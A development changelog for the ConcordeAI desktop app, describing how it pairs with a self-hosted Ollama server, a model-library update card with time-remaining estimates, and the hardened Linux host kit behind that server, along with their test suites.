  Screenshots of a dev copy: `scratchpad/servers-pane.png`,
  `scratchpad/servers-menu.png`.
- **Pairing** (PROTOCOL.md 3): the person types the code the server's
  screen shows (`sudo ollama1-pair`). The app makes a new Ed25519 key
  (PyNaCl, `cai_crypto.available()` first), sends the public half and the
  code's HMAC with a fresh nonce, and checks the server's `device_id` and
  `proof` in constant time before saving anything. A wrong code says how
  many tries are left; no window, a closed one, a replay and a lost save
  each have their line. A 429 (tries 2 s apart) is waited out once, a
  clock_skew is retried once with the server's clock. Pairing again
  replaces the key only once the new pairing is proven.
- **Storage.** `servers.json` in the profile's folder (0600 from the first
  byte, through `_write_raw`), named in `PERSONAL_NAMES`: the address, the
  Access token and this profile's device key (the seed). In memory the
  token and the seed are `_Secret` (repr/str/format say `<redacted>`,
  `json.dumps` refuses it, it can't be pickled; M10's `cai_crypto`
  redaction isn't merged, so this is the small local equivalent). The page
  gets `_srv_public` only: never the token or the seed. PROTOCOL.md says
  "the macOS Keychain"; the brief for this build said "stored like cloud
  keys", so it is a 0600 file like cloud.json. Moving both to the Keychain
  is a follow-up (it would also cover Windows' Credential Manager).
- **Requests** (PROTOCOL.md 1, 4): http.client, no redirects followed, a
  new connection each time, `User-Agent: ConcordeAI/<version>`, the Access
  headers when saved, and the four X-O1 headers over the exact bytes sent.
  A chat sends what local Ollama would get: the model, each turn's role,
  text and pictures, `stream: true` and the temperature. No keep_alive.
  A clock_skew or replay refusal is signed again once.
- **Errors, in one line each** (`_srv_fail`): offline (refused, timed out,
  DNS, or Cloudflare's 502/503/52x with no gateway code), TLS, Access
  (a redirect, Cloudflare's 403 page, or the gateway's `access`), pairing
  lost (401/403 `unpaired`, `bad_signature`, `unsigned`: "Desktop no longer
  accepts this computer: the pairing was lost. Pair again in Settings ›
  Your servers."), busy (409/429/503 `busy`), `gpu_fit`, `gpu_spill` and
  the coming `ram_pressure`, a model not installed (404), and anything else
  with the gateway's own words. A failure after the 200 is the stream's
  last NDJSON line and ends the answer. The device switch's reload needs
  nothing from the app: the stream just starts later, and the step says
  "asking Desktop" while it waits.
- **Models.** A paired server's `/api/tags` fills the engine menu (below
  Advanced): "Desktop · qwen3:14b", a 🖥️ and "your server"; a model with
  `placement: "gpu+ram"` says "yours · card + memory, slower", and the
  pane lists it as "card + memory, slower". A server that doesn't send
  `placement` (the gateway on main today) reads "unknown" and gets no
  note. `gpu_pct` from `/api/ps` is kept. Names with "embed" are left out
  of the picker. The list is checked when the pane opens, at start, and
  when the menu opens with a list over a minute old.
- **Routing, kept small for the gpu-fit-2 and benchmark rebases.**
  `run_model` sends a server label (`"<name> · <model>"`, which no catalog
  label is) to `server_stream` before anything else; the `/api/chat`
  model filter accepts a label of one of the profile's servers; one
  server model sets `_srv_lbl`, skips the MODEL_ROUTES substring match and
  the pre-warm, and gets its own branch (`server_answer`) after Cloud
  Only, Remote and research, **before the Fast lane's cloud ladder** and
  the council. `run_council` keeps a hand-picked server model instead of
  skipping it as "not downloaded".
- **Policy.** A paired server is permission to use it: nothing in the
  section asks `cloud_allowed`, and the gauntlet pins that it never names
  the cloud gate, the ladders or the tiers. Cloud Only's line-up is the
  key bench, so a server model is never in it; no tier resolves to one; a
  council has one only when it is ticked in Advanced (it is not added to
  councils on its own). Nothing falls back: `server_answer` catches every
  failure and says it, so the handler's catch-all never tries the smallest
  local model, and there is no cloud rung. The answer's badge names the
  server ("Desktop"), and a server model's name ("gpt-oss") no longer
  reads as "cloud".
- **The benchmark (6b331):** a chat on one server model is not refused
  during a benchmark and takes no hold (it uses none of this computer's
  engines), and `_bench_guarded` lets a server label through. A council,
  a tier or a picture still takes the hold as before. The memory pass
  after a server answer goes to the same server model; a title uses a
  local model as before (refused during a run, as for any chat).
- **Usage:** each call is one ledger record under its label with
  `w: "server"`, counted from Ollama's last line; the answer record is
  under the label too.
- **Profiles:** `servers.json` and `_srv_seen` (the last check, the
  clock offset) are the profile's; B sees none of A's servers and a label
  of A's answers "That server isn't in Settings › Your servers any more."
  in B without a request leaving.
- **Hook for the benchmark's later step:** `server_models(ctx)` gives the
  labels, and `server_stream` returns Ollama's last line (eval_count,
  eval_duration, prompt_eval_*). Server models are not benchmarked yet.
- **Test hook** (dev copies only): `server-http-loopback` lets an address
  be `http://127.0.0.1:<port>`; everything else must be https.
- Left for part 2: the SSH installer, the SSH-tunnel reach mode (the
  gateway's `access: "none"`), and LAN mode.
- Gauntlet: 491 checks become 517 (26 new). New, in `== your own servers (6b334) ==`:
  - in process, the section exec'd alone on the real profile sections and
    cai_crypto: PROTOCOL.md's vectors read from the file and rebuilt byte
    for byte (device id, both signatures, pairing key, MAC, proof, the
    code's spellings); pairing against a stand-in that checks the MAC as
    the spec writes it (no window, a wrong code, a tampered proof and
    another device's id refused with nothing saved, a rate limit waited
    out, fresh nonces, 0600, re-pair, remove); the secrets (redacted,
    refused by JSON and pickle, in no reply or error); the stream (signed
    and verified by the spec's check, only the chat sent, the ledger, an
    error line, one retry for replay and clock skew, a second refusal
    said, a gone server and any other failure said with no other model);
    each refusal's reading; the real transport against a listener (the
    Access headers, a verifying signature, the User-Agent) and a closed
    port read as offline; addresses, names, tokens; placement; labels,
    the one-model rule, no cloud gate in the section, profile B; source
    pins where it meets run_model, the council, the benchmark and
    /api/chat; the pane's cards and menu rows in node; the benchmark's
    guard. 35 mutations, each caught.
  - live: the REAL gateway (`ollama1/bin/ollama1-gateway`) on its stub
    Ollama, with its pairing step on a thread (as the root path unit
    runs), behind a stand-in for Access that wants the service token and
    adds a real RS256 JWT, and a copy of the app on 9903: a wrong token
    turned away; no window, a wrong code, the right one (typed in lower
    case with a space) pairing exactly this device; a signed chat streamed
    with cloud power off, carrying only the chat, in the ledger as server;
    a replay refused by the gateway, no nonce repeated; busy, gpu_fit and a
    replay signed again; Cloud Only and the tiers never seat it; a server
    chat during a benchmark answers while a local one gets 409; the device
    removed at the desktop says "pair again", pairing again works; the
    stand-in down says offline with cloud power on and nothing else
    answers; profile B sees none of it; the secret and the seed in no /api
    reply, no log and no file but servers.json; still paired after a
    restart; remove deletes the key.
  - adapted (nothing loosened): the rail and pane order and the
    description count gain Your servers; the benchmark's chat-hold pin and
    its "chat not held" mutation follow the hold under the server-only
    test; `_bm_ns` names `server_label`.
- Not verified here: a real Cloudflare Tunnel and Access in front (the
  stand-in plays Access; the redirect and 403 pages Cloudflare sends are
  modelled on its documented behaviour), TLS to the real host, the
  `placement` field from the real gateway (the other agent's change; read
  from canned replies here), the ROCm desktop itself, WKWebView and
  WebView2 (the pane was checked in headless Chrome and Blink), Windows.
- **Review round (regressions, security, Patrick's copy and chips).**
  - *Pictures stay on the server that was picked.* The vision takeover
    set the Qwen vision model before the server pick was known, so a
    picture went to the cloud, to local vision or into a 6.6 GB download.
    Now the pick keeps it: the picked model reads it when Ollama's
    `/api/show` lists `vision` (asked once, remembered), else another
    model on the SAME server that does (the badge names it:
    "Desktop · llava:7b"), else "Desktop has no model that reads
    pictures". Never the cloud or this computer, whatever Use cloud power
    says. A picture no longer takes the benchmark hold.
  - *Making things uses this computer.* A server chat that asks for a
    picture, a video or a file takes the benchmark hold before those
    branches and, during a run, gets the benchmark's line. The local
    painter and the local video studio sit out a running benchmark
    however they are reached (a saved Gemini key may still paint).
  - *The stream's deadlines were on the wrong socket.* http.client hands
    an HTTP/1.0 (close-delimited) response the socket and sets
    `conn.sock` to None, so the 600 s wait was never set and the 12 s
    connect timeout stayed: a model load over 12 s would have cut the
    answer. The socket is kept when the request goes out
    (`conn.o1_sock`); up to 600 s to the first line, then 120 s with no
    byte ends the answer ("Desktop sent nothing for 2 minutes").
  - *Status checks:* one at a time per server (a second `?refresh=1`
    waits for the first), servers checked side by side, 15 s in all per
    check.
  - *X-Models* is percent-encoded outside printable ASCII
    (`header_text`; the page's `hdrText` decodes it): a server named
    "Pat’s Desktop", "Desktop – 4090" or in CJK raised in `send_header`
    and every chat on it died after the question was saved. It is the
    only header built from a person's text (Content-Disposition already
    had its RFC 6266 fold; the rest are fixed or validated ids).
  - *The kept state:* a removal or deletion strips servers.json's Access
    tokens and device keys (`_kept_servers_raw`), the addresses and names
    kept; an unreadable one goes to the trash.
  - *A council of server models only* that none answers says why ("None
    of the picked models answered. Desktop didn't answer…"); the
    handler's local `alt` rescue is never tried for it.
  - An answer past 2,000,000 characters is cut there, said. The pairing
    proof compares bytes (a non-ASCII device id is a failed proof, not a
    TypeError). `server_pick` takes only a model the server last listed
    (the names are kept in servers.json) and never an Ollama cloud tag
    (`-cloud`, `:cloud`), which the picker leaves out too.
  - *The card:* whether an Access token is saved, and Change Access token
    (both fields empty removes it); the Access error points at it. A
    repaint keeps what was typed, the cursor and the card's line.
  - *The badge:* a council names its servers beside "this Mac" or
    "cloud" ("this Mac + Desktop"); a server called "cloud box" or a
    model called gpt-oss never reads as the cloud. A council led by a
    server model warms its first local model, never a catalog name found
    inside the server's.
  - *Patrick's copy:* the pane opens "For advanced users. Connect a
    dedicated server you run yourself, so it can take on queries and
    speed up answers. Instructions for setting one up are available
    here · Setup scripts." (the guide at
    docs/your-own-server.md and the ollama1 folder on GitHub, plain
    `target=_blank` links like the site link, which pywebview opens in
    the system browser). No "ollama1" is shown anywhere in the app. The
    pane says a cloud compositor in an Advanced council gets the
    server's drafts.
  - *A chip per paired server's card* beside MLX, in its style: "● AMD"
    red, "● NVIDIA" green (the existing chip colours), "● INTEL" blue
    (#3d8fe0); the title "Desktop · Radeon RX 6900 XT · 16 GB"; dimmed
    while the server doesn't answer; one per server. Read only from
    `gpu: {vendor, name, vram_bytes}` in the gateway's `/api/version` or
    `/v1/info` (the host kit is adding it); nothing said, no chip.
  - Gauntlet: 4 more in-process checks (pictures, the deadlines and one
    check at a time, the headers/kept state/copy/council, the chips in
    node), 33 more mutations (68 in all), and live: a picture to the
    picked reader and to the same server's reader with cloud power on, a
    picture asked for during a benchmark, a council of server models
    down, and the whole live run under a server named
    "Pat’s Desk – デスク" (X-Models checked on the wire).
  - Gauntlet after rebasing onto a050b4f: 562/562. Two older pins
    followed the vision-download line; two live checks were loosened
    only where main's ollama1 kit changed (the gateway now sends
    `placement` and the stub lists more models; the memory pass after
    a picture chat goes to the same server model).
  - Not verified: `docs/your-own-server.md` doesn't exist in the repo
    yet (the link will 404 until it does); the chip against the real
    gateway (canned `gpu` here).
- **Patrick, once setup has finished on the desktop:**
  1. Keep the Access service token's Client ID and Client Secret that
     setup showed once.
  2. ConcordeAI › Settings › Your servers › Add a server: address
     `https://ollama1.flyconcordefly.com`, name Desktop, the Client ID and
     Secret. Add. The card should read "Not paired · reachable".
  3. At the desktop (or over SSH): `sudo ollama1-pair`. A 12-character
     code shows on the monitor and in that terminal for 5 minutes.
  4. Type it into the card and press Pair. The card turns "Paired ·
     reachable" with the models.
  5. Pick "Desktop · <model>" in the composer's engine menu.

---

## 6b335 — the model offer says what will change, and how long is left
Per Patrick, with a screenshot of "More models available" mid-download:
"we should have time remaining here too, and a details box before
starting saying what changes to the model library will be made". Then
his report from the shipped app: the card stuck at "8.5 / 8.5 GB · 100%",
then went back to "0 / 8.5 GB · 0%" and stayed there, with the model
installed and its engine running.
- THE PLAN IS THE SERVER'S. `model_offer_plan()` (GET /api/models/offer)
  decides the whole change once. Download: the Max spread's models not on
  disk, plus the replacement of every retired model (on disk, or swept with
  its offer kept), one row per download, none already in flight, each with
  a reason: "new", "not installed yet", "newer version of X" (same first
  word and role) or "replaces X". Remove: exactly `_auto_clean_targets()`,
  the rule the auto-clean pass now uses too (factored out of
  `_auto_cleanup_pass`): retired models only, only ones this app
  downloaded, never one whose engine is up, nothing with the switch off,
  nothing during a download or an app update. keep_n: every other model on
  disk. Totals: GB to download, GB freed, disk free after (from the home
  volume, like /api/setup).
- NOTHING UNLISTED GOES. The button POSTs the plan_id and both lists it
  showed; the route makes a fresh plan and carries it out
  (`apply_model_offer`: the Remove list through `_remove_models`, then the
  downloads) only if `offer_matches` says it's the same plan. Otherwise it
  answers 409 with the new plan, changes nothing, and the card shows the new
  list ("The list changed. Check it again."). A removed model whose
  replacement is listed keeps its offer until that lands, as a sweep does.
- THE CARD. Download / Remove groups (name, size, reason), "N other models
  unchanged", the totals, then "Update model library" (per Patrick: that
  label whatever the mix, no counts; the list says what changes), "Not now"
  and the existing "Don't remind me again". A long list scrolls inside
  itself; the card never passes the window. It shows only when the plan
  has something to download, and "fresh" now means a download not yet in
  seen_models (it used to be any missing catalog row, and Download then
  installed the Max plan whatever was fresh).
- TIME LEFT, ONE HELPER. `dlLeft(key, have, want)` on the page: an
  exponential moving average of the byte rate over ~10 s, weighted by time
  so pollers at any pace agree, bias-corrected so the early estimate is the
  average so far. Silent until 3 s or 1% has been seen, silent while bytes
  stand still, "waiting for the download to resume" after 15 s, a new clock
  after a 30 s gap or bytes going backwards. "about N min left", "about N h
  M min left", "under a minute left", 72 h at most. Every bar uses it: the
  setup panel, the studio cards, the Manage note, Update models ("modup"),
  the card and the strip ("batch"). The strip shows the time left in the
  speed's place (both outgrew the sidebar) and a stall on its left. The
  server now sends have_b/want_b (a tenth of a GB is four seconds of a fast
  line); its eta_min stays in the payloads but the page no longer reads it,
  and `dlEta` is gone.
- WHY IT STUCK. mlx-community's Ministral 3 14B ships two shards
  (model-0000N-of-00002) beside a model.safetensors.index.json naming four
  (-of-00004). `mlx_model_cached` required every indexed part, so the
  finished model read missing forever (mlx_lm loads the files it finds, so
  the engine ran). Its job said done, so /api/setup called it ready and not
  busy, but `_downloaded_bytes` counted only cached models: the bar fell to
  0, and the card, waiting for "not busy AND 100%", never ended. The 100%
  before that was `_dir_bytes` following the snapshot links into blobs/,
  counting every byte twice, so the bar hit 100% half way through. Fixed:
  `_shards_complete` accepts a stale index when the one shard series that
  IS there is whole (a gap still fails); a job that is done counts in full;
  MLX progress uses `_dir_bytes_real`, and a download larger than the
  catalog's figure grows the total; overall_pct is never 100 while anything
  still downloads. The old check also had the model offered again on every
  later launch, and roster and plans calling it missing; that ends too.
- THE CARD FINISHES. `offerProgress(started, s)` reads the models the click
  started: bytes line while any moves (covering the whole batch, time left
  included); "Finishing: checking the files…" while only Ollama's hash
  remains; "Loading <model>…" while a just-downloaded MLX engine opens its
  port (`loading_since` on the job, `_engine_loading`, five minutes at
  most); then "Done ✓ · added N models" plus what was removed, or
  "Couldn't download X (reason)" with a Retry of just those. Run in
  background works as before.
- URGENT, FOUND IN REVIEW: on the installed build the leftover sweep would
  have deleted Patrick's finished Ministral 3 14B a day after it landed
  (it removes an MLX folder the cache check calls unfinished, once nothing
  in it is under a day old). The stale-index fix is what keeps it; the
  sweep now also never touches a model whose engine is up (`_resident`),
  and a test runs his exact layout, two days old, through the real sweep.
- REVIEW FIXES: only the bytes line is held together (a failure's reason
  wraps, `overflow-wrap:anywhere` for a path); Ollama's check reads
  "Finishing: checking the files… · N waiting" and is never a stall
  (`checking` on /api/setup and /api/setup/busy, dlLeft's hold, the strip
  says "checking"); a late poll's smaller byte count (under 1% of the
  total, or within 2 s) is ignored rather than restarting the clock; bytes
  moving after a stall start a fresh estimate; after a failure "Run in
  background" reads "Close"; `_shards_complete` requires real files, so a
  link whose blob never landed fails; the engines list and voice status
  count bytes once too (`_dir_bytes` has no callers left).
- GAUNTLET: time left on known timings (warm-up, smoothing, a stall, hours,
  the cap, a gap) in node; the plan on a fake disk, its Remove list equal to
  what the auto-clean pass takes in the same state; the page's own list in
  node matching the plan exactly; the button removing exactly the listed
  models; any other list refused; the route matching before acting; seven
  mutations (remove all retired, a Remove list off the rule, a row left off
  the page, the match ignoring removals, a resident engine, removals during
  a download, the route skipping the match), each caught; the primary label
  pinned; live GET and a stale POST refused with 409; the stale-index check,
  the byte counting, the loading state and the card's whole lifecycle
  (queued, downloading, finishing, loading, done, failed, and Patrick's
  stuck case) in node.

---

## 6b333 — ollama1: a private model server on Patrick's desktop (host kit)
The spare Linux desktop (Ryzen 9 5950X, 64 GB, RX 6900 XT 16 GB, Ubuntu
26.04) becomes **ollama1**, a model server for ConcordeAI that only
Patrick's paired devices can use. This build is the desktop side only,
all of it in `ollama1/`; `millenai.py` is untouched. The app's "Desktop · …"
provider comes later and follows `ollama1/PROTOCOL.md`. How to run it is in
`ollama1/README.md`.
- **Two locks on every request.** Cloudflare Access (a service token; the
  gateway re-checks the `Cf-Access-Jwt-Assertion` RS256 JWT against the
  team's certs, the AUD tag, and the one token's Client ID) and an Ed25519
  signature over method, path, body hash, timestamp, nonce and device id.
  There is a 60 s skew window and nonces are remembered for 2 minutes. After
  a restart, anything signed before the start is refused, so the in-memory
  nonce cache can't be sidestepped. RSA is checked in pure stdlib by
  rebuilding the whole PKCS#1 block; Ed25519 uses PyNaCl on the desktop
  (`cryptography` elsewhere), never a pure-Python fallback.
- **Pairing only at the desktop.** `sudo ollama1-pair` or the panel's button
  opens a 5-minute window. A 12-character (60-bit) Crockford code shows on
  tty1 and in that terminal, never in the panel. The app sends its public key plus
  HMAC(sha256(code), …), and gets a proof back.
  - Limits: one success per window, 5 wrong codes close it, one attempt
    every 2 s.
  - The gateway never sees the code (second commit, review F7). It checks
    the request's shape and pace, drops it in a spool and relays the
    answer. A root path unit checks the MAC, counts wrong codes, refuses
    reused nonces, writes `devices.json` and computes the proof. A
    compromised gateway can't add a key or learn the code.
  - Refused on the LAN listener (F2): LAN mode is plain HTTP, and a sniffed
    MAC could be brute-forced offline.
  - No invite/share/join exists anywhere, per Patrick's rule.
- **Stateless.** Bodies live in memory for one request. Journal lines and
  the stats file carry counts, timings, model and device names.
  `test_stateless.py` checks the source (AST: no writes, no log fields from
  body variables, the default request log silenced) and sends marker prompts
  through a live gateway, then greps every file and all output for them.
- **GPU only.** Before a load, weights + f16 KV cache for the requested
  num_ctx + a margin must fit in VRAM less 768 MiB. After the load,
  `/api/ps` must show `size_vram == size`; otherwise the model is unloaded
  and the request gets `gpu_spill`.
  - Sampling options only: `num_gpu`, `main_gpu`, `use_mmap` and the like
    are stripped, since they could push layers to the CPU after the check.
    `keep_alive` is dropped too.
  - Ollama cloud models (`remote_host`/`remote_model`, `-cloud` tags) are
    hidden and refused.
  - One job on the GPU at a time, a queue of 8.
  - Streaming sends 200 early (Cloudflare's 100 s first-byte limit), so
    later failures arrive as a final NDJSON `{"error","code"}` line.
- **Admin panel** (stdlib HTTP + vanilla JS, strict CSP with nonces):
  - Access JWT whose email equals the configured admin email, on every
    request. Actions need a CSRF token, Origin, JSON and same-origin.
  - Buttons only `systemctl start` fixed units. Polkit lets `o1admin` start
    exactly those, plus `ollama1-{pull,rmmodel}@<12 hex>` /
    `ollama1-rmdevice@<16 hex>`. The root helper maps a hash back to an
    allow-listed or installed model.
  - `/term/` proxies ttyd (127.0.0.1, `login`), with the WebSocket relayed
    by hand.
  - Services run with `NoNewPrivileges`, so sudo could never work for the
    panel; polkit is the only way.
- **Local port guard** (`ollama1-nft`, an nft `output` chain on `meta
  skuid`). Only root, `ollama`, the gateway and the panel reach 11434; only
  the panel reaches ttyd; only cloudflared reaches 8431/8432. Without it,
  any local user (pmiller included) could talk to Ollama directly.
- **Disks by serial, never by name.** The fstab comment already had sda/sdb
  swapped. `/home` is copied onto / through a bind mount of / (the real
  folder under the mount point) and checked with rsync `--checksum` plus
  the authorized_keys hash. Only then is fstab edited.
  - If a login still holds the old `/home`, it is lazily unmounted, and the
    mirror waits until an `O_EXCL` open of both 8 TB disks succeeds (i.e.
    after a re-login).
  - The mirror is RAID1 on partitions that stop 100 MiB short of the end,
    so a slightly smaller replacement disk fits.
- **GRUB 30 s** was `GRUB_RECORDFAIL_TIMEOUT`, through the EFI
  `recordfail_broken` path (GRUB can't write its env on LVM). The drop-in
  sets it and `GRUB_TIMEOUT` to 5 with the menu visible. Setup fails unless
  every `set timeout=` in grub.cfg is 5.
- **Network: the bridge is Patrick's.** `br0` over enp39s0 and enp38s0 is at
  192.168.86.10 and carries the Pi. Setup never touches netplan.
  - Bridge netfilter is kept off with a sysctl drop-in (systemd re-applies
    it if `br_netfilter` loads), plus `ufw route allow in on br0 out on br0`.
  - SSH is allowed in on br0 from 192.168.86.0/24.
- **SSH.**
  - The drop-in is `10-ollama1.conf`, read before `50-cloud-init.conf`.
    Its `PasswordAuthentication yes` is also commented out.
  - Validated with `sshd -t` and `sshd -T -C`; the previous files are
    restored on failure.
  - Passwords go off only if authorized_keys holds a key other than
    `claude-setup@concordeai`. That setup key is removed only with
    `--remove-setup-key` or a typed `yes`.
- **Updates.**
  - unattended-upgrades: security + cloudflared (`origin=cloudflared,
    codename=any`). The Cloudflare apt key's fingerprint is pinned. Reboot
    at 04:00 America/New_York.
  - Ollama: weekly. Base + ROCm archives must match `sha256sum.txt`, and
    GitHub's asset digest when present. Unpacked with `filter="data"`; a
    health check with rollback; the previous version is kept.
- **Cloudflare with one API token** (second commit). The token is pasted at
  setup's prompt; `cloudflared tunnel login` plus dashboard clicks are only
  the fallback. `ollama1-cf-access` then does everything, reusing whatever
  already exists:
  - finds the zone and its account, and the team domain; with no Zero Trust
    organization it names the one dashboard click needed;
  - creates a **locally-managed** tunnel through the API (`config_src:
    local`), so routes and cloudflared's Access check stay in
    `/etc/ollama1/cloudflared.yml`. The credential JSON is built from the
    tunnel's token endpoint, so a lost `/etc/cloudflared/ollama1.json` is
    rebuilt for the same tunnel;
  - makes one proxied CNAME per hostname: wrong targets fixed, duplicates
    removed, and it stops (deleting nothing) if a record of another type
    uses the name;
  - sets up the Access apps, policies and service token, whose secret is
    printed once and saved nowhere.

  The token: `read -s` in setup, piped with the `printf` builtin (never
  argv or env), held in memory only by the helper, and a reminder to delete
  it (1-day TTL recommended). `tests/test_cloudflare.py` runs the helper
  against a fake Cloudflare API: reruns make no writes, no duplicate DNS,
  and the token appears in no file, temp file or output. There are 5 more
  mutants.
- **Review fixes (second commit).**
  - Gateway and panel:
    - Every error response closes the connection, so an unread body can't
      pass as the next request on a connection cloudflared reuses (F1).
    - Access and the signature headers are checked before the body is read.
    - Requests in flight are capped at 16, and bodies at 32 MiB (F3).
    - An exception after the stream has started ends it with an error line,
      not a 500 in mid-chunk (F5).
  - Port guard and units:
    - The port guard matches `fib daddr type local`, and the services
      `Requires=` it.
    - ttyd listens on a UNIX socket that only root and the panel's user can
      open, with no TCP port (F6).
    - `LimitCORE=0` and `MemorySwapMax=0` on Ollama and the gateway;
      `OLLAMA_DEBUG=0` (F9).
    - `/term/` pages get `X-Frame-Options: DENY` and a frame-ancestors CSP.
  - Secrets:
    - The service-token secret goes to /dev/tty, never through setup's
      tee'd log (F4).
    - The repo scan now covers every added line in the branch, with 64-hex,
      32-hex and UUID patterns and case-insensitive email TLDs (F8).
  - Nothing mixes: when consecutive jobs come from different paired
    devices, every loaded model is unloaded first. No prompt cache is
    shared; the cost is one reload per device switch.
  - setup.sh:
    - The disk steps moved into `lib/setuplib.sh`, tested with fake disk
      tools in `tests/test_setuplib.py`.
    - It makes a filesystem whenever the array has none, and never writes
      an fstab line without a UUID.
    - It checks `mdadm --examine` before any wipe and reassembles a mirror
      already on the disks.
    - It refuses unexpected signatures and disks still used by
      fstab/crypttab/swap, and wipes only through `/dev/disk/by-id` after
      exact serial checks.
    - It reads free space as extents (`vg_free_count`) and stops loudly if
      it can't.
    - No `MaxAuthTries 4`. It shows each "own" key's comment and
      fingerprint and wants a typed yes before turning passwords off. It
      tells Patrick to keep the session open and test a new login.
    - It runs inside tmux. Firewall and SSH come before the Ollama
      download.
    - For the `/home` move: the root's own `/home` is set aside, not
      deleted; there is a final re-sync before the switch; `du` warnings
      are tolerated.
    - Only the pinned Cloudflare apt key is kept.
    - It checks with `ss` that only sshd listens beyond loopback.
    - Choice 2 requires the Client ID.
- Found while testing the 12-character codes: `o1big.render` iterated a
  glyph's rows instead of the row's pixels, so the big pairing code came out
  blank in the first commit; only the small `XXXX-XXXX-XXXX` line was
  readable. It is fixed, and `test_big.py` plus a mutant watch it.
- **Re-review fixes (third commit).**
  - Disks:
    - mkfs only on an array or partition this run created (a
      `*.mkfs-pending` marker in /var/lib/ollama1, cleared after the
      format). A found or reassembled one without a readable filesystem
      stops setup with the `mke2fs -n` / `e2fsck -b` hint.
    - Any `blkid -p` exit other than 0 or 2 stops setup.
  - Setup run:
    - The lock is taken before the kit is copied to /var/tmp; `--no-tmux`
      keeps it, the tmux run takes it over.
    - The exit status comes back out of tmux.
    - The final listener check judges by systemd unit (cgroup), not program
      name.
    - The gateway's user is taken out of `o1pair` on existing installs
      (`SupplementaryGroups=` only adds groups), and setup stops if it is
      still there.
  - Gateway: the device switch fails closed. After unloading, `/api/ps`
    must show nothing loaded, or the request gets 503 and the last device
    stays as it was.
  - cf-access:
    - The service token is created with `duration: forever`.
    - Its secret is shown on the tty the moment it's made. A state flag
      makes the next run rotate it if it was never shown.
    - Only CNAMEs pointing at a tunnel, or made by the helper, are changed.
    - Redirects are never followed.
- **Models that may use system memory (after 6857fee).** Patrick wants
  gemma4:26b, qwen3.6:35b and gpt-oss:120b (about 61 GB) allowed into the
  64 GB of RAM; every other model stays GPU only.
  - A flag after the name in `models.allow` (`gpt-oss:120b  ram`). The
    parser is strict: an unknown or repeated flag, a bad name or a
    duplicate makes the line ignored, and the panel lists it with the
    reason. Plain lines stay GPU only.
  - Fit budget for `ram` models: VRAM less 768 MiB, plus MemAvailable (and
    what loaded models hold in RAM, since they are unloaded first), less
    `ram_margin_gib` (never under 6). Without an explicit num_ctx the
    context steps 8192 → 4096 → 2048 to fit; gpt-oss:120b fits at 8192
    with an idle machine.
  - After the load, the "100% GPU" refusal is skipped for `ram` models
    only. Instead the model is unloaded and `ram_pressure` returned if
    SwapFree fell by more than 512 MiB or MemAvailable is under 1 GiB.
    `MemorySwapMax=0` still keeps Ollama itself out of swap.
  - A `ram` model loads alone (the gateway unloads the others and confirms
    through /api/ps, else 503), and it is unloaded before a GPU-only model
    runs. `OLLAMA_MAX_LOADED_MODELS=2` stays for GPU-only pairs such as a
    chat model plus an embedder.
  - `/api/tags` and `/api/ps` carry `placement` (`gpu`/`gpu+ram`) and
    `gpu_pct`. The dashboard and panel show the GPU share, with "rest in
    RAM" for flagged models.
- **For other people's servers** (`docs/your-own-server.md`, the public
  guide):
  - `"access": "none"` lets an SSH tunnel be the way in, without Cloudflare
    (signatures still required);
  - `ollama_rocm` / `--no-rocm` for NVIDIA or CPU boxes, and an
    `nvidia-smi` VRAM fallback;
  - `cf_zone` and templated hostnames, so the Cloudflare helper isn't tied
    to flyconcordefly.com.

  setup.sh stays Patrick's machine only; the guide says so and gives manual
  steps until the app's "Add a server".
- **Follow-ups to the review of 6dcd842.**
  - In `access: none` the tunnel's local port is reachable from any web
    page in the browser. The gateway now requires a loopback `Host`
    (127.0.0.1 or localhost, with or without the port), refuses any
    `Origin`, and needs `Content-Type: application/json` on POST. That
    stops pairing attempts being burned from a page, and DNS rebinding.
  - The gateway won't start with `access: none` while `tunnel_id` is set.
  - `make_room` also unloads any loaded model with `size_vram < size`
    before a GPU-only job, so a model whose `ram` flag was removed while
    loaded doesn't stay beside it.
  - The gateway gets `OOMScoreAdjust=-500`.
  - probe_none_pair.py and probe_ram.py are now tests, with mutants.
  - Suite: 205 tests; 80 mutants, all caught.
- **gpt-oss:120b froze the desktop** when it was run straight into Ollama
  (`sudo ollama run`, no gateway). The journal stops mid-load, after
  `load_mode = mmap` and llama.cpp's "tensor overrides to CPU are used with
  mmap enabled", with no OOM or GPU message. The likely cause: the CPU half
  (about 45 GiB) sat in mmap'd page cache, with no memory cap, so the
  kernel thrashed on reclaim instead of killing anything. Changes:
  - A hard cap on `ollama.service`: `MemoryMax` = MemTotal − 8 GiB,
    `MemoryHigh` 2 GiB below, from `/proc/meminfo`, in a drop-in written by
    setup.sh and checked after the restart. `MemorySwapMax=0` stays.
    - The runner is a child of `ollama serve`, so it is inside the same
      cgroup; the test script lists the cgroup's processes to show it.
    - `OOMPolicy=continue`: the kernel kills the runner and `serve` keeps
      going.
    - The gateway reads `oom_kill` from the cgroup's `memory.events` and
      answers `ram_oom` if a load was stopped.
    - Ollama failures (connection reset mid-load or mid-stream) are no
      longer taken for the client leaving: the gateway answers 502 `ollama`,
      or an error line when streaming.
  - `ram` models go with `options.use_mmap: false`, both in the gateway's
    warm load and in the request. In Ollama v0.34.4's `llm/llama_server.go`,
    `appendLoadModeArgs` turns that into llama-server `--load-mode none`
    (the flag the warning asked for). `needsReload` compares UseMMap, so both
    requests must agree, and they do. There is no OLLAMA_* env for it, and
    setting it per request keeps GPU-only models on mmap (fine for them).
    Unverified on 0.35.x, which is on the desktop; the test script checks the
    journal for the mmap warning and for `--load-mode none`.
  - A stricter fit for `ram` models: 2.5 GiB of compute buffers instead of
    256 MiB, a margin of max(8 GiB, 12% of RAM), and the RAM part must also
    fit under Ollama's MemoryMax less 1 GiB (`ollama_memory_max_bytes`,
    written by setup).
    - On this machine (60.7 GiB RAM, about 58.5 GiB free, 16 GiB VRAM) the
      budget is about 65.7 GiB.
    - gpt-oss:120b at 4096 needs about 66.6 GiB if its file is 61 GiB (the
      gateway refuses it, clearly) or 62.4 GiB if it is 61 GB (it fits).
      Either way it is within about 1 GiB of the limit. The README calls it
      experimental on 64 GB machines.
  - `tools/ram-model-test.sh` is the controlled live test Patrick runs with
    sudo:
    - it shows the gateway's verdict and asks for yes;
    - it sets the cap with `systemctl set-property --runtime` (and won't
      load unless it took);
    - it unloads everything, loads with `use_mmap: false`, logs memory
      every second, and kills Ollama if the host drops under 1.5 GiB free;
    - it reports loaded (split, tok/s, peak) / stopped by the limit /
      stopped by the watchdog, then unloads.
  - Suite: 215 tests; 86 mutants, all caught. The gateway gets `OOMScoreAdjust=-500` (the previous commit). Its
    verdict code is tested against the stub; the rest is static-checked.
